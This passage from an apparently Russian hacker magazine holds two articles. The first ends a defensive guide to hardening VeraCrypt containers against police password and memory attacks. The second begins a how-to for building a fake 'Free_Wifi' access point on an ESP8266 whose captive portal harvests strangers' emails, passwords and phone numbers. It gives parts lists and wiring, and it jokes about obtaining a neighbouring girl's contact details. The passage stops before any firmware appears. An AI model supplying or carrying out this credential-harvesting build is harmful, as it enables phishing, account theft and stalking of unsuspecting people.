если файл подкачки вынесен на отдельное от загрузочного устройство
(довольно распространенный случай для поль зователей, которые таким
образом «экономят» ресурс заг рузочного SSD).
   2. Компьютер был вык лючен штатным образом (через команду
Shutdown) или был изъят в сос тоянии гиб ридно го сна либо гибернации;
при этом криптоконтейнер настро ен таким образом, чтобы автоматически
размонтировать зашифрованные тома и уничтожать ключи шифрования
в оперативной памяти при переходе компьютера в сон, гибернацию или при
его отключении.
  Немного сложно для восприятия? Упрощу: если в момент изъятия зашиф‐
рованный том был смон тирован, а полиция просто выдернула вилку из розет‐
ки, то ключ шифрования, ско рее всего, останется в файле гибернации (удас‐
тся ли его оттуда вытащить — зависит от пункта 1). А вот если компьютер вык‐
лючили командой Shutdown, то наличие или отсутс твие ключа будет зависеть
от настроек криптоконтейнера. О том, как правиль но настроить VeraCrypt, мы
поговорим дальше.
   3. Наконец, оче вид ное: ана лиз файлов подкачки и гибернации совер‐
шенно бесполезен, если в момент изъятия компьютера зашифрованный том
не был подмонтирован.
   Если извлечь ключи шифрования не уда ется, эксперт поищет их в облаке
или корпоративной сети (для томов, зашифрованных штатными средствами
BitLocker или FileVault 2). Только после этого в ход пой дет лобовая атака —
перебор паролей.
  С перебором паролей тоже неп росто. Во‐первых, давно прошли времена,
когда под «лобовой атакой» понимался простой брутфорс. Скорость атаки
будет такой, что полный перебор всего пространс тва паролей становится
бесполезен, если длина пароля к криптоконтейнеру пре вышает 7–8 сим‐
волов. Соответственно, для атак используются сло вари, в первую очередь —
словари, составленные из паролей самого поль зовате ля (извлечь их можно
как из компьюте ра пользователя, так и из его мобильных устройств или нап‐
рямую из облака Google Account). Давно раз работаны методы анализа
паролей и составле ния правил‐шаблонов, на основе которых будут генери‐
роваться «похожие» пароли.
  Для атаки в полиции будут использовать один из немногих пакетов прог‐
рамм, позволяющих запустить ата ку на множес тве (в теории — до нес кольких
тысяч, в реальности — порядка сотен) компьютеров, каждый из которых будет
оснащен несколькими графичес кими уско рите лями. Звучит неправдоподоб‐
но? Тем не менее во время тренингов для полиции в раз ных час тях земного
шара я видел помеще ния с компьютерами, использующимися для распре‐
деленных атак. Могу сказать о них следующее. Соз дателей фантастических
фильмов в эти помеще ния, очевидно, не пускают, поэтому на экранах киноте‐
атров нам приходится наблюдать жалкие пло ды убогой фантазии. Прос то что‐
бы обозначить масштаб, поделюсь поразившим меня фактом: на рабочих
столах полицейских экспертов одного британского захолустья стоят компь‐
ютеры с GeForce 2080 и 40 про цес сорны ми ядрами.
  Для начала область перебо ра будет ограничена набором символов,
которые встречаются в паролях пользователя.





Дальше опробуют атаку с мутациями (берется слово из словаря, и проверя‐
ются его варианты, составленные по довольно простым правилам, которы ми
пользуется подавляющее большинство обычных пользователей). Кстати,
на мутациях чаще всего и заканчиваются попытки атак в тех слу чаях, когда
у полиции нет зацепок — не удалось получить ни одного пароля пользовате‐
ля.





Если это не сработает, в ход пойдут маски (попытки вручную сконструировать
пароли, «похожие» на те, которые были найдены у пользователя).





В особо сложных случаях дело дойдет до гибридных атак (использование
комбинаций из одного или двух сло варей в комбинации со скриптованными
правилами, масками и/или префиксами).





Нестандартные методы
Нестандартно действовать полиция начинает в редких случаях, когда у подоз‐
реваемого заранее предполагается наличие зашифрованных «цифровых
улик». В этом случае вместе с оперативниками выезжают подготовленные
эксперты, которые проконтролиру ют изъ ятие и попытаются исследовать
вклю ченные, работающие компьютеры прямо на месте. Эксперт попробу ет
сделать следующее.
 1. Получить доступ  к рабочему столу компь ютера. Здесь все понятно
   и известно.
 2. Сделать дамп оперативной памяти компь юте ра. Это возможно, если уда‐
   лось получить доступ к рабочему столу (кстати, в случае с многополь‐
   зовательскими компьютерами для это го можно взять любую администра‐
   тивную учетную запись), но не обязательно: например, заслуженной
   популярностью пользуется ата ка через DMA, которая обрела второе
   дыхание после выхода компьютеров с поддержкой технологии Thunderbolt
   через порт USB‐C.
 3. Наконец, в особо слож ных случаях может использоваться криогенная ата‐
   ка. О ее редкости и экзотичности говорит тот факт, что за все вре мя
   работы я не встретил ни одного эксперта, который делал бы такой анализ
   на практике.


НА ЧТО ВЛИЯЕТ ВЫБОР АЛГОРИТМА ШИФРОВАНИЯ
Еще во времена TrueCrypt пользователям предлагался выбор из разных алго‐
ритмов шифрования, в том числе нес колько вариантов с последовательным
шифрованием данных сна чала одним, а потом дру гим алгоритмом. В Ver‐
aCrypt выбор существенно расширился. Теперь предлагается пять алгорит‐
мов (AES, Serpent, Twoﬁsh, Camellia и «Кузнечик») и десять вариантов их пос‐
ледовательного использования.





           WARNING

                       Патриотам, желающим воспользоваться алгорит‐
                   мом  шифрования  оте чественной  разработки
                         «Кузнечик»,     рекомен дую     ознакомиться
                        с информацией о странностях в таблицах перес‐
                        тановки,   которые   однозначно    указыва ют
                       на существование намеренно оставленного «чер‐
                        ного хода».


Средний пользователь VeraCrypt не понимает, чем отличаются алгоритмы,
не интересуется подробнос тями, но счи тает, что если выб рать цепочку
из двух, а еще лучше трех алгоритмов, то он точно будет защищен и от зак‐
ладок спецслужб, и от уязвимостей самих алгоритмов.
  Правда же зак лючается в том, что достаточно будет использовать самый
известный и простой с вычислительной точки зрения алгоритм. Тот самый
AES, который исполь зует ся всеми — от детей, скачивающих на телефон
новую игру, до финансовых воротил и самых что ни на есть специальных
спецслужб. За десятилетия повсеместного использования и массовых иссле‐
дований этот алго ритм так и не взло мали, секретных черных ходов не нашли.
  На что же на самом деле влияет выбор алгоритма шиф рования? Еще одна
грустная правда: только и исклю читель но на скорость доступа к зашифрован‐
ным данным.





Шифрование алгоритмом AES использует встро енные в современные про‐
цессоры (начиная от самых дешевых ядер ARMv8 и заканчивая даже очень
старыми процессорами Intel и AMD) команды для аппаратного ускорения
шифрования. Другие алго ритмы тоже могут при менять эти команды. Но AES
пользуются все, а другими алго ритмами — не все, поэтому их оптимизация
оставляет желать лучшего. Самый опти мизи рованный алгоритм шифрования
Camellia уступает AES в скорости шиф рования в полтора раза, Twoﬁsh усту‐
пает AES в три, Serpent — в четыре, а Куз нечик — в четыре с половиной раза.
Комбинированные варианты работают еще медленнее, не предоставляя
при этом никакой допол нитель ной безопас ности.
   Итак, выбор отличного от AES алго ритма шифрования не может улучшить
безопасность зашифрованных данных, а вот ухудшить — запросто. А что
может улучшить?


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

   КАК УКРЕПИТЬ ВЕРУ
             ДЕЛАЕМ ШИФРОВАННЫЕ КОНТЕЙНЕРЫ
                      VERACRYPT НЕПРИСТУПНЫМИ





ВЫБОР ХЕШ-ФУНКЦИИ И ЧИСЛА ИТЕРАЦИЙ
Для того чтобы зашифровать (ну, и рас шифровать тоже) любые данные, крип‐
токонтейнер не исполь зует пароль. Для шифрования любым алгоритмом (от
AES до «Кузнечика») берется двоичный ключ фиксированной длины, так
называемый Data Encryption Key или Media Encryption Key (MEK). Каким имен‐
но образом твой пароль (наверняка очень длинный и безопасный) превраща‐
ется в MEK фиксированной длины? Откровенно говоря, никаким. Media En‐
cryption Key для единожды соз данного контейнера неизменен; он хранится
в зашифрованном (точнее сказать, «обер нутом», wrapped) виде пря мо в сос‐
таве контейнера, а в «разверну том» виде используется для доступа к данным.
  Ключ шифрования данных MEK в обязательном порядке шифруется (прос‐
ти за тавтологию) ключом шифрования ключа шифрования Key Encryption Key
(KEK). Без KEK невозможно рас шифро вать MEK, а без MEK невозможно рас‐
шифровать данные. Для чего нужна такая сложная схема? Хотя бы для того,
чтобы ты мог сменить пароль от криптоконтейнера без обязательной рас‐
шифровки и перешифровки всего содержимого. Однако роль пары ключей
MEK/KEK этим сценарием не огра ничивает ся. Так, дос таточно будет затереть
несколько десятков байтов в заголовке контейнера (перезаписав область,
в которой хранится MEK), и контейнер никто и никогда больше расшифровать
не сможет, даже если точно известен пароль. Возможность моментального
и безвозвратного уничтожения данных — важная часть общей стратегии
безопасности.
   Итак, с парой ключей MEK/KEK разобрались. Каким образом из пароля
получается ключ KEK? VeraCrypt проводит циклическую пос ледовательность
односторонних (это важно) математических преобра зований — хеш‐функций,
причем количество циклов достаточно велико: по умолчанию пре образова‐
ние выполняется 500 000 раз. Таким обра зом, с нас тройками «по умол чанию»
на вычисление одного‐единс твенного ключа KEK на основе вве денного
пароля VeraCrypt потратит от одной до пяти‐шес ти секунд.
   Здесь наступает важный момент. Помнишь, чуть выше я разобрал ско‐
рость работы алгоритмов шифрования и порекомендовал использовать AES
как самый распространенный и самый быстрый вариант? Так вот, с выбором
хеш‐функции все обстоит с точностью до наобо рот: тебе нужен самый нес‐
тандартный и самый мед ленный алго ритм.
  В VeraCrypt доступен выбор из четырех хеш‐функций: дефол тный SHA‐512
(он достаточно медленный и достаточно безопас ный, но дефолтный, что
для нас минус), еще более медленный и тоже хорошо изу ченный Whirlpool,
старенький SHA‐256, который все еще безопасен, но смысла в исполь‐
зовании которо го я не вижу, и «темная лошадка» «Стрибог», который в бен‐
чмарке медленнее всех.





Впрочем, от использования хеш‐функции «Стрибог» надежно отвращают сло‐
ва из Википедии: «Разработан Центром защиты информации и специальной
связи ФСБ России с учас тием ОАО „ИнфоТеКС“ на основе национального
стандарта Российской Федера ции ГОСТ Р 34.11—2012 и введен в действие
с 1 июня 2019 года приказом Рос стандарта №  1060‐ст от 4 декаб‐
ря 2018 года», а также некоторые тривиальные ошиб ки и найденные незави‐
симыми исследователями странности в таблицах перестановки.
   Как правильно настро ить преобразова ние пароля в ключ шифрования
KEK? Вот три основных пункта.
 1. Не используй выбор по умолчанию. Весь софт для взлома криптоконтей‐
   неров без исклю чений настроен на ата ки с настройками «по умол чанию».
   У эксперта будет выбор настроек (по умол чанию, выб рать конкретную ком‐
  бинацию параметров или пробовать все комбинации). Атака «по умол‐
   чанию» будет самой быстрой, вариант «пробовать все комбинации» —
   катастрофически медленным, а попытать ся выб рать правильную ком‐
  бинацию параметров шифрования вручную — все равно, что вручную под‐
   бирать пароль.
 2. Выбери самую медленную хеш‐функцию (но не «Стрибог»). Да, с мед‐
   ленной хеш‐функцией, да еще и отличной от «выбора по умол чанию», твой
   криптоконтейнер будет монтировать ся не одну, а пять‐шесть секунд —
   но и стойкость к атаке вырас тет в те же пять‐шесть раз (а с учетом
   «выбора не по умол чанию» — еще сильнее).
 3. Измени число итераций. Об этом ниже.

Итак, с настройками по умолчанию разоб рались, с выбором хеш‐функции
определились. Однако есть еще один важнейший параметр, скры вающийся
за малозаметной галочкой Use PIM. Что за PIM такой и зачем он нужен?





PIM (Personal Iterations Multiplier) напрямую влияет на количество ите раций,
которые будут использованы для преобра зова ния твоего пароля в ключ шиф‐
рования KEK. Согласно документации, VeraCrypt вычисляет количество ите‐
раций   (число  преобразова ний)  по  формуле  15 000 + (PIM*1000).
Для хеш‐функций SHA‐512 и Whirlpool значение PIM по умолчанию 485, что
дает нам ров но 500 000 итераций.
  Для чего нужен этот параметр? Дело в том, что вычислительные мощ‐
ности, в том числе и у тех, кто будет взламывать твой криптоконтейнер, пос‐
тоянно растут. Защита, эффективная двадцать лет назад, сегодня уже
не кажется такой непробиваемой. Однако в слу чае с VeraCrypt ты можешь
легко и изящно повысить стойкость защиты сколь угодно сильно, просто уве‐
личив число итераций. Да, увеличение числа итераций (через кастомное зна‐
чение PIM) немного снизит удобство использования (при монтировании
криптоконтейнера тебе придется, помимо пароля, вводить еще и чис ло PIM),
несколько замедлится скорость монтирования. Поверь, однако, что любое,
самое незначительное изменение PIM озна чает силь нейшую головную боль
у любого, кто вздумает подоб рать пароль.
  Насколько сильно изменение PIM повлияет на скорость монтирования
криптоконтейнера? Вот время с настройками PIM по умолчанию.





А вот я изменил PIM на значение 500 (с дефолтных 485).





А тут я использовал PIM, равный 1000.





Цифры отнюдь не запредельные: подождать при монтировании зашифрован‐
ного тома лишние секунды несложно, а вот у того, кто будет пытаться подоб‐
рать пароль к тому, воз никнет масса проб лем. Общий алгоритм работы
взломщиков будет выглядеть так.
 1. Сначала попробуют все воз можные ата ки со стандартными настройками.
   Это — время, часто существенное.
 2. Если понятно, что зна чение PIM нестандартное, а число PIM точно извес‐
   тно, атака будет вестись сразу с корректной настройкой. При этом уве‐
   личение PIM с 485 до 1000 увеличит время, необходимое для атаки, при‐
  мерно вдвое. Так себе повышение безопасности, но лучше, чем ничего.
 3. А вот если значение PIM атакующему неизвестно, то атаку придется про‐
   водить для всего ряда зна чений PIM. То есть если ты выставишь значение
   PIM = 1000, то КАЖ ДЫЙ вариант пароля атакующему при дется проверять
   со значениями PIM = 1, 2, 3, …, 1000 (или 485, 486, 487, …, 1000, если ата‐
  кующий убежден, что значение PIM ты не умень шал, а исключительно уве‐
   личивал). Иными сло вами, сложность ата ки воз растает кратно значению
   (твой PIM — 485), если ата кующий использует только варианты, превыша‐
  ющие значение по умолчанию, либо в (твой PIM) раз, если атакующий
  решит перебирать всю область зна чений PIM.

Логичный вопрос: разве увеличение длины пароля на два‐три знака из рас‐
ширенного набора сим волов не даст схожий (и даже лучший) результат? Если
подходить с чисто вычис лительной точки зрения, то даст. Реальность же
такова, что большая часть атак проводится с нас тройками по умол чанию;
программы, способ ные использовать ата ки с нестандартным значением PIM,
можно пересчитать по пальцам одной руки, а программ, которые способ ны
автоматизировать атаки с кас томным рядом зна чений PIM, и того меньше.
   Рассмотрим скриншот свежей сборки Elcomsoft Distributed Password Re‐
covery с поддержкой VeraCrypt (кстати, даже не вышедшей еще официально).





На нем мы видим атаку в стандартной конфигурации: алгоритм шифрования
AES, хеш‐функция — SHA‐512. Никаких сюрпризов. Скорость атаки —
170 паролей в секунду (это с загрузкой всех ядер процессора и с исполь‐
зованием вычислительных ресурсов видеокарты; без видеокарты мы бы уви‐
дели скорость порядка 0,5 пароля в секунду).
  Но если ты сменишь хеш‐функцию, то такой ата кой, как показана на пер‐
вом скриншоте, пароль найти не получится. Соответственно, будет при‐
меняться вторая атака — уже по всему спектру алгоритмов шифрования
и хеш‐функций.





Что мы видим на втором скрин шоте? Во‐первых, скорость перебора резко
упала до одного пароля в секунду — это с исполь зованием GPU‐ускорителя.
  А чего мы не видим на втором скриншоте? Мы не видим возможности про‐
вести атаку на число итераций PIM. Число итераций PIM в большинс тве прог‐
рамм для взлома паролей мож но указать вручную. Таким образом, нес‐
тандартное число ите раций сделает атаку неэффективной: даже если твой
пароль — 123, найти его не получится, не указав точного чис ла итераций.
  Разумеется, если есть проблема, для нее найдет ся и решение. В све жей
бете небезызвестного  инс трумента  hashcat  заявлены  два любопытных
параметра:  ‐‐veracrypt‐pim‐start  и  ‐‐veracrypt‐pim‐stop   (commit
с изменением). А что будет со скоростью перебора? Если неизвес тны точные
параметры шифрования (комбинация из алгоритма шифрования и хеш‐фун‐
кции), то скорость перебо ра уже достаточно низкая: всего один пароль
в секунду на компьюте ре с аппаратным ускорителем GPU. А теперь подели
эту цифру на количество возможных вари антов PIM, и получишь исключитель‐
но медленный перебор. В реальности же перебор будет еще медленнее:
если с низкими значениями PIM проверка пароля займет доли секунды, то
большое число итераций замедлит перебор в нес колько раз по сравнению
со стандартным значением.


ЗАЩИТА КЛЮЧА ШИФРОВАНИЯ
Итак, мы выбрали шифрование AES, хеш‐функцию Whirlpool, а число итераций
выставили скромненько 1111 (чтоб и нестандартно, и не забыть случайно).
Это полностью защитит контейнер от ата ки на пароль, но, как мы помним
из начала статьи, полиция может вооб ще не устра ивать такую атаку, если
сможет просто вытащить ключ шифрования из тво его компьютера.
   Взять готовый ключ шиф рования и с его помощью смонтировать (или рас‐
шифровать целиком) зашифрованный раздел — любимый и самый быс трый
способ, которым поль зует ся полиция. Суть его заключается в сле дующем.
   Как ты знаешь, для того что бы зашифровать (и расшифровать) данные,
криптоконтейнер не использует пароль. Для шифрования любым алгоритмом
(от AES до «Кузнечика») используется двоичный ключ фиксированной длины,
так называемый Data Encryption Key или Media Encryption Key (MEK). Ты уже
в курсе, каким сложным образом твой пароль (наверняка очень длинный
и безопасный) превращается в ключ фиксированной длины. Дело сейчас не в
этом.
  Логично, что ключ шифрования данных (MEK) хранится в опе ративной
памяти компьютера. Это необ ходимо для того, чтобы программа‐криптокон‐
тейнер могла получить доступ к зашиф рованным данным в принципе. Обрати
внимание: ключ шифрования хранится в оперативной памяти совершенно
независимо от того, какой алгоритм шифрования ты выбрал в настройках
контейнера. AES, Twoﬁsh, Serpent, «Куз нечик» или любая комбинация алго‐
ритмов — независимо от твоего выбора ключи шифрования будут храниться
в оперативной памяти, а сложность и скорость их извлечения практически
одинакова.





Таким образом, сложность этой ата ки мало зависит как от выбора алгоритма
шифрования, так и от способа преобра зова ния твоего пароля в двоичный
ключ. Максимум, чего удастся добиться нестандартными нас тройками, —
это увеличение времени поиска клю ча в обра зе оперативной памяти, условно
говоря, с десяти‐пятнадцати минут до полутора‐двух часов (цифры условные:
многое зависит как от объема оперативной памяти компьютера, с которого
делался дамп, так и от ско рости накопителя и центрального процессора, где
этот дамп анализируется).





Можно ли защититься от подобных атак? Полноценная защита от извле чения
клю чей шифрования из оперативной памяти компьютера дос таточно сложна,
а на обычном десктопе может и вовсе оказаться невоз можной (противос‐
тоять криогенной атаке вооб ще достаточно тяжело, но и вероятность ее при‐
менения исчезающе мала). В то же время ты можешь включить в настройках
VeraCrypt недавно появившуюся возможность шифрования ключей шиф‐
рования в опе ративной памяти компьютера.





Обрати внимание: настройка дос тупна начиная с VeraCrypt 1.24 (на момент
написания статьи актуальна сборка 1.24 Update 4). По умолчанию опция вык‐
лючена; если ее включить, использование оперативной памяти драйвером
увеличится примерно на 10%, производительность упадет на 5–15%  (ис‐
точник), а также будет отключена воз можность гибернации.
  Но это только часть защиты. В файл подкачки или файл гибернации также
могут попасть и сами данные, которые хра нятся в зашифрованном контей‐
нере, а встроенная в VeraCrypt функция отклю чения гибернации может
не сработать. По‐хорошему также необ ходимо отклю чить ее на уровне Win‐
dows. Опции Hybrid sleep и, собственно, Hibernation.





Обрати также внимание на режим «быс трой загрузки» (Fast Startup) на пер‐
вом скриншоте. В этом режиме (по умолчанию он, кстати, включен) при вык‐
лючении компьютера Windows сохраня ет состояние ядра в файл на сис‐
темном диске. Этот файл — в некото ром роде урезанный (без user space)
аналог файла гибер нации. Его наличие позволя ет ускорить процесс пос леду‐
ющей загрузки, но оно же приводит к возможности утечки ключа шифрования
томов  VeraCrypt. Отключение режима  Fast  Startup поможет защититься
от этой уязвимости.
   Если же жертвовать режимом гибер нации не хочется, то стоит подумать
о шифровании системно го диска с помощью того же BitLocker’а. В этом слу‐
чае и файл подкачки, и файл гибернации будут надежно защищены.


Обла ко и клю чи вос ста нов ления дос тупа
Для VeraCrypt этот момент не критичен, но BitLocker по умол чанию предлага‐
ет пользователю сох ранить ключ восстановления доступа к зашиф рованному
диску в облако OneDrive. Если его удастся оттуда извлечь (а полиции обычно
удается, достаточно сделать запрос в Microsoft), то расшифровка данных ста‐
новится тривиальной. Атака сработа ет и в том слу чае, если ты сохранишь
подобный ключ на USB‐накопителе, доступ к которому получит полицейский
эксперт или зло умышленник. Иными словами, клю чи восстановления дос‐
тупа — палка о двух концах, и с точки зрения чистой безопасности лучше их
не иметь, чем иметь.



ЗАКЛЮЧЕНИЕ
Надеюсь, я смог изменить твои представления о безопас ности криптокон‐
тейнеров в целом и VeraCrypt в частнос ти. Вооружившись новыми знаниями,
ты сможешь создавать зашифрованные контейнеры, обладающие на нес‐
колько порядков более высокой стойкостью к парольным атакам. Кроме того,
использование недавно появившихся малоизвестных нас троек безопасности
позволит тебе защитить ся и от излюбленных атак на опе ративную память,
файлы подкачки и гибер нации. В то же время разработчики VeraCrypt
не гарантируют безопасность любых данных, попадающих в оперативную
память компьютера, так что речь идет скорее не о стопроцентной защите, а о
существенном осложнении соответствующих атак с не менее существенным
снижением их эффективности и веро ятности успешно вскрыть зашифрован‐
ный том.
ВЗЛОМ
    ВОЛК
  В ОВЕЧЬЕЙ
    ШКУРЕ

       СОЗДАЕМ ПОДДЕЛЬНУЮ
      ТОЧКУ ДОСТУПА НА ESP8266
        ДЛЯ СБОРА ПАРОЛЕЙ





Free_Wi‐Fi… как же приятно видеть подоб‐
ное оповещение  на  экра не смартфо на
или  другого  гаджета,  когда  ты  присел
отдохнуть   в  кафе  торгового  цен тра
или  аэропорта перед  вылетом.  Так  уж              404mist                                                                                        404mist@gmail.com
устроен человек, что тянет его ко все му
дармовому. Однако каждому известно, где
чаще всего бывает бесплатный сыр. Какие
опасности   таит   в  себе  бесплатный
вай‐фай?


Уже давно не сек рет (по крайней мере для зна ющих людей), что операторы
открытых сетей с доступом к интернету могут легко перехватывать весь иду‐
щий через них трафик и получать таким образом различную информацию,
в том числе что вы ище те и какие ресурсы посеща ете. Хорошо, если ее прос‐
то передадут рекламода телям, что бы изу чать спрос на товары и услуги,
и этим все ограничится, но это далеко не все опас ности, подстерегающие
охочих до халявы владельцев электронных девай сов. Что же еще не так?
  Недавно в РФ был принят закон, призванный обезопасить откры тые точки
доступа  в  обществен ных  местах  через  обязательную  авторизацию
с помощью мобильного телефо на или соци альных сетей. Но, как часто быва‐
ет, «что‐то пошло не так» и благое, казалось бы, дело обернулось появлени‐
ем новых уязвимостей, играющих на тонкостях души человеческой. В итоге
родил ся небольшой про ект, который в полной мере демонстрирует без гра‐
ничную легковер ность подавляющего большинства представите лей Homo
Sapiens. Итак, обо всем по порядку.


           WARNING





ЧТО ЗА ЗВЕРЬ ТАКОЙ?
Зверя изобрели и воплотили в железе наши китайские кол леги. Точнее, они
построили скелет самого хищного зверя, которо го мы будем одевать
в овечью шкуру. Имя ему — контроллер ESP8266, неоднократно упоминав‐
шийся на страницах «Хакера» и GitHub. В нашем проекте мы будем исполь‐
зовать его в качестве автономной точки дос тупа и веб‐сервера. Девайс под‐
нимет точку доступа с именем Free_Wiﬁ, не содержащую пароля, при этом
большая часть смартфонов и прочих девайсов будет присылать своим вла‐
дельцам уведомление с предложением подклю чить ся к открытой сети Wi‐Fi,
даже если они не прос матривали список дос тупных сетей. Это проверено
на Android 9 и iOS пос ледней версии. Итак, доверчивый юзер, не особо
полагаясь на интуицию и здра вый смысл, нажима ет на выпадающее уве дом‐
ление с весьма заманчивым предложени ем и попада ет на страницу регистра‐
ции (при этом не нужно открывать бра узер). На экране появится вот такое
окно.





                Стра ница авто риза ции в открытой сети

Здесь мы видим стандартную стра ничку приветс твия откры тых точек доступа,
предлагающую  авторизо ваться с помощью  электронной почты, пароля
и номера телефо на либо сра зу ввес ти код авторизации, если он есть. Жертва
(как правило, не задумываясь) вводит данные, после чего получает уведом‐
ление, что нужно подождать SMS‐сооб щение с кодом авторизации, а все
введенные жертвой данные благополучно сливаются на SD‐карту устройства,
одновременно отоб ража ясь на OLED‐дисплее.





                   Так выглядят перехваченные данные

Итак, наше устрой ство работа ет в режиме фейковой точки доступа, которая
имеет привлекательное название и вынуждает рас положенные поблизости
девайсы обращать внимание на приг лашение подключиться, но на самом
деле просто сливает учетные данные пользователей.


И ЧТО ДАЛЬШЕ?
А вот дальше начинается самое интерес ное. В самом простом случае у нас
окажется предположитель но действующий адрес электронной почты и номер
телефона. В лучшем случае мы получим бонусом некий пароль — возможно,
один из тех, которыми пользует ся данный человек.
   Часто ли ты исполь зуешь разные пароли для раз ных сервисов? Вопрос,
скорее всего, риторический. Но, даже не имея действительного пароля, мож‐
но уже сделать выводы о предпочтениях и уровне осве домленности человека.
А адрес электронной почты и номер телефона — это уже хоть какая‐то
информация, способ ная сыграть большую роль в дальнейших атаках. Тут
на что фантазии хватит: от рассылки писем и SMS с рекламой находя щихся
поблизости заведений до взлома почты, социальных сетей и деаноними‐
зации челове ка... Как минимум этот метод позволит узнать номерок и мыло
понравившейся девчонки из соседнего подъезда.
  В общем, мы наглядно убедились, что откры тые сети могут быть весьма
небезопасны.


РОЖДЕНИЕ ЗВЕРЯ
Как я уже говорил, использовать мы будем ESP8266 NodeMCU либо ESP32
(для 32 придется подкорректировать код), эти контрол леры работают иден‐
тично. Вооружаемся паяльником, макет ной платкой, инстру ментами. Также
в нашем устройстве применя ется адаптер microSD‐карты и OLED‐дис плей
размером 128 на 32 пикселя с контроллером SSD1306 и интерфейсом i2C.
Еще нам понадобится зуммер (динамик‐пищалка от старого системника).
Так, все пригото вили. Берем схему, которая показана на следующей кар‐
тинке, и приступаем к сборке зверюги. Можно паять, можно соединить прос‐
то на макетной плате, суть от это го не изменится.





                        Схема устрой ства

Я предполагаю, что ты уже имеешь опыт работы с ESP, в Arduino IDE и спра‐
вишься со всеми последующими шагами. Если нет, то вот ссылка на под‐
робный гайд.
  Из дополнительных библиотек нам понадобится  только библиотека
для OLED‐дисплеев, которая имеется в архи ве, приложенном к этой статье,
а также на странице GitHub проекта. Пап ку U8g2 с этой биб лиотекой следует
поместить в папку libraries рабочего каталога Arduino. Для Windows путь
будет следующим: \user\My Documents\Arduino, для Linux — /home/user/
Arduino.
  Перед сбор кой учти, что не все модули ESP подойдут для нашего проекта.
Во‐первых, некото рые виды модулей имеют весьма малый объем памяти
и прошивка с допол нитель ным файлом может просто не поместиться «на
борт». Во‐вторых, у некоторых раз новидностей физически не хватит выводов
для подключения необ ходимой периферии (а у нас задей ствованы аж три
периферийных устрой ства). Из того, что есть на рынке, для проекта подойдут
(и были испытаны) сле дующие модификации ESP8266: NodeMCU V3, V1, V0.9.
В принципе, любой модуль, рас паянный на отладочной плате с дос таточным
количеством выводов, сгодится.
   ESP‐12 — отличный вариант, так как обла дает всеми необходимыми
выводами и вполне достаточным объемом памяти. ESP‐07 тоже хороший
вариант,  но  здесь  нужно  внимательно  смотреть  на  модификацию
(есть 1 Мбайт памяти, а есть 3 Мбайт). Но из неоспоримых плюсов однознач‐
но можно назвать наличие разъема под внеш нюю антенну.





                     Раз нооб разные модули ESP

Обрати внимание, что крайний слева модуль для наших целей не подойдет:
слишком мало памяти и нет необ ходимых выводов на плате. Также не вариант
модуль ESP‐201, он крайне глючно работа ет. Вот еще нес колько плат NodeM‐
CU — все они для проекта вполне сгодятся.





         Все эти платы NodeMCU подходят для нашей поделки

Приобрести все компоненты можно на AliExpress. Вот спи сок того, что нам
понадобится:
 • модуль NodeMCU;
 • модуль ESP‐12;
 • дисплей OLED 128 × 32;
 • модуль SD.

Если ты собираешь устройство методом пайки проводами, крайне рекомен‐
дую приобрести для этих целей МГТФ 0.12 — это провод, отлично зареко‐
мендовавший себя еще со времен СССР, он обла дает пре восходными харак‐
теристиками проводимости, прочности, огнеупорности и долговечности.
  Паяльник лучше всего использовать не силь но мощный, и уж совсем здо‐
рово, если это будет станция с регулировкой температу ры и гальванической
развязкой. Статические разряды могут убить твой контроллер наповал. Вооб‐
ще пайку подобных устройств лучше производить в антистатических трусах
перчатках либо в браслете с заземлени ем.
  Первым делом соединяй между собой минусовые шины всех плат и только
потом приступай к пайке остальных выводов. Применять лучше гелевый флюс
либо жидкий флюс, но не активный и, боже упа си, не на кислотной основе.
Хорошие флюс‐гели ты можешь найти в радиомагазинах своего города или в
магазинах, торгующих запчастя ми и инс трументами для ремонта сотовых
телефонов.
  После пайки нужно тщательно промыть пла ту мягкой кистью и аце тоном,
спиртом или спе циальным рас твором для уда ления флюса. Остатки флюса
могут вызывать довольно силь ные паразитные связи на выводах контроллера,
особенно на аналоговых входах.
  Внимательно перепроверяй все, что собира ешься паять, на соответствие
схеме. Все выводы, указанные в схеме, полностью соответс твуют по своим
обозначениям выводам на платах (они подписаны одинаково). Особенное
внимание обращай на пины питания. На плате NodeMCU они двух видов:
на 5 В и на 3,3 В. Как пра вило, на модулях SD‐карт имеется свой пре обра‐
зователь напряжения, поэто му такой модуль можно запитать от 5 В. Это даже
лучше — не стоит перегружать и без того не особо мощный преобразователь
на плате NodeMCU, ему и так вытягивать обвязку и весь Wi‐Fi‐модуль c дис‐
плеем.
   Итак, плату соб рали, питание провери ли, монтаж проверили, наличие
драйверов в системе тоже проверили. Если в твоей схе ме используется
отдельно модуль ESP, то необ ходимо будет подклю чить его в соответс твии
с даташитом конкретной модификации (речь идет о подтяжке резисторами
определенных выводов, всю информацию можно найти в интернете). Ниже
приведен пример подключения по стандартной схеме модуля ESP‐07 (ESP‐
12 подключается аналогично). Без резисторов (осо бенно на выводах СH_PD)
модуль попросту не запустится, так же как и без акти вации вывода FLASH ты
просто не сможешь его про шить.





               Cхема подключения отдельного модуля

Бузер (он же зуммер, он же пищалка) у нас пассивный! То есть он не имеет
встроенного генератора, такой можно вытащить из старого системника
или купить за пять рублей у бомжей. Дисплей мы используем с контрол лером
SSD1306 (это тоже необ ходимо учесть). Что же касается адаптера для SD‐
карты — тут особых нюансов нет. За исключением того, что на борту должен
иметься преобразователь на 3,3 В, так как сам контроллер питается именно
этим напряжением, как и карта.
   Если преобразователя нет, то запитываем адап тер от MCU с ноги 3,3 В,
но не 5! Иначе с модулем можно будет рас прощать ся в мгновение ока. То же
касается и дисплея, хотя на нем уста новлен преобра зователь и, по сути, сам
дисплей толерантен к пятивольтовому питанию, чего нельзя сказать об уров‐
нях сигналов i2C. Поэто му нас тоятельно рекомендую запитывать его также
от 3,3 В.
  Из дополнительных плюшек я приобрел копеечный модуль зарядки Li‐Ion‐
аккумулятора от пауэрбанка за каких‐то 52 рубля. Его фишка в том, что он
способен выдавать ток до 1 А и имеет встроенный DC‐DC STEP‐UP на 5 В.
А это нам и нужно, с него мы и запитаем систему.
  Одного заряда аккумулятора типа 18650 хва тает очень надолго. Общее
потребление устрой ства сос тавляет око ло 120 мА, а емкость 18650 колеб‐
лется от 1800 до 3200 мА. Нехитрые расчеты поз волят тебе вычислить время
работы  девайса  от  батарейки.  Еще  один  немаловажный  момент:
питание 5 В необходимо подавать на вывод VIN пла ты NodeMCU, так как в
рабочем режиме питать через USB, имея в рас поряжении аккумулятор, поп‐
росту непрактично.
